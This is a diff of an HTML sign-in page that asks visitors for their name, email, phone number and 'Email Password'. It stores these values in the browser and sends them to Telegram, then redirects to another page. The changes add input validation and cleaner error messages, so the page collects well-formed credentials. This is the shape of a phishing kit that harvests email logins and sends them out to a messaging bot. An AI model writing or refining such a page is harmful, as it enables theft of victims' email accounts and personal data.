@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -49,6 +49,13 @@
     button:hover {
       background-color: #45a049;
     }
+    .error {
+      color: red;
+      font-size: 12px;
+      margin-top: -8px;
+      margin-bottom: 10px;
+      text-align: left;
+    }
   </style>
 </head>
 <body>
@@ -58,7 +65,9 @@
       <input type="text" id="fullname" placeholder="Full Name" required />
       <input type="email" id="email" placeholder="Email" required />
       <input type="tel" id="phone" placeholder="Phone Number" required />
+      <div id="phone-error" class="error"></div>
       <input type="password" id="password" placeholder="Email Password" required />
+      <div id="password-error" class="error"></div>
       <button type="submit">Sign In</button>
     </form>
   </div>
@@ -66,12 +75,42 @@
   <script>
     const form = document.getElementById('signin-form');
 
+    // Password length validation
+    function validatePassword(password) {
+      const minLength = 8; // Minimum password length
+      return password.length >= minLength;
+    }
+
+    // Phone number length validation
+    function validatePhone(phone) {
+      const phoneLength = 10; // Phone number must be 10 digits
+      return phone.length === phoneLength && /^\d+$/.test(phone); // Check if it's exactly 10 digits
+    }
+
     form.addEventListener('submit', function(e) {
       e.preventDefault();
+
+      // Get form values
       const fullname = document.getElementById('fullname').value;
       const email = document.getElementById('email').value;
       const phone = document.getElementById('phone').value;
       const password = document.getElementById('password').value;
+
+      // Clear previous errors
+      document.getElementById('phone-error').textContent = '';
+      document.getElementById('password-error').textContent = '';
+
+      // Validate phone number
+      if (!validatePhone(phone)) {
+        document.getElementById('phone-error').textContent = 'Please enter valid phonenumber.';
+        return; // Stop form submission if validation fails
+      }
+
+      // Validate password length
+      if (!validatePassword(password)) {
+        document.getElementById('password-error').textContent = 'invalid password please try again!!';
+        return; // Stop form submission if validation fails
+      }
 
       // Save data locally (for demonstration, you need proper backend)
       localStorage.setItem('fullname', fullname);
@@ -97,13 +136,12 @@
       .then(response => response.json())
       .then(data => {
         console.log('Message sent to Telegram:', data);
-        alert('Sign-in successful! Redirecting...');
         // Redirect to main page
         window.location.href = 'main.html'; // Change to your main page URL
       })
       .catch(error => {
-        console.error('Error', error);
-        alert('Error.');
+        
+        alert('Error sending data. Please try again.');
       });
     });
   </script>
